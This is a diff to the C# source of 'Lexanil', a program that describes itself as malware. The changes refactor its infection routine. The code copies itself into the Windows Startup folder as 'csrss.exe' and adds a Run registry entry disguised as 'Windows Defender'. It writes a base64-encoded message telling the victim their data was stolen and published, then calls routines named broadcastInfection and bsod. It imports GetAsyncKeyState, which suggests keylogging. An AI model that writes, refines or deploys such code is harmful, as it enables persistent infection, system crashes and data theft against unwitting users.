@@ -11,6 +11,8 @@ using System.Net.Sockets;
 using Microsoft.Win32;
 
 using static Lexanil.NativeMethods;
+using System.Reflection;
+using System.Text;
 
 namespace Lexanil
 {
@@ -47,6 +49,17 @@ namespace Lexanil
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern short GetAsyncKeyState(Keys key);
         #endregion
+    }
+
+    public static class Paths
+    {
+        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        public static readonly string ProgramFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+        public static readonly string ProgramFilesX86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
+        public static readonly string Startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+        public static readonly string Lxnl = Path.Combine(AppData, ".lxnl");
+        public static readonly string OurAppPath = Assembly.GetExecutingAssembly().Location;
+        
     }
 
     public partial class MainWindow : Form
@@ -108,24 +121,20 @@ namespace Lexanil
         {
             try
             {
-                if (File.Exists(Environment.SpecialFolder.ApplicationData + "\\.lxnl"))
+                if (File.Exists(Paths.Lxnl))
                 {
-                    var curfilename = AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName;
-
-                    File.Copy(curfilename, Environment.SpecialFolder.Startup + "\\csrss.exe");
+                    File.Copy(Paths.OurAppPath, Path.Combine(Paths.Startup, "csrss.exe"));
                     var rWrite = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 
-                    rWrite.SetValue("Windows Defender",
-                                      AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName);
+                    rWrite.SetValue("Windows Defender", Paths.OurAppPath);
                 }
-                else if (!Directory.Exists(Environment.SpecialFolder.ApplicationData + "\\.lxnl"))
+                else
                 {
-                    File.Create(Environment.SpecialFolder.ApplicationData + "\\.lxnl").Close();
-                    File.WriteAllText(Environment.SpecialFolder.ApplicationData + "\\.lxnl", System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes($"Hello {Environment.UserName} Your PC has been infected by Lexanil, a new type of malware which has already stolen your data and published on the internet, good luck and thanks for the data!")));
+                    var text = $"Hello {Environment.UserName} Your PC has been infected by Lexanil, a new type of malware which has already stolen your data and published on the internet, good luck and thanks for the data!";
+                    File.WriteAllText(Paths.Lxnl, Convert.ToBase64String(Encoding.UTF8.GetBytes(text)));
                     broadcastInfection();
                     bsod();
                 }
-
             }
             catch (Exception)
             {
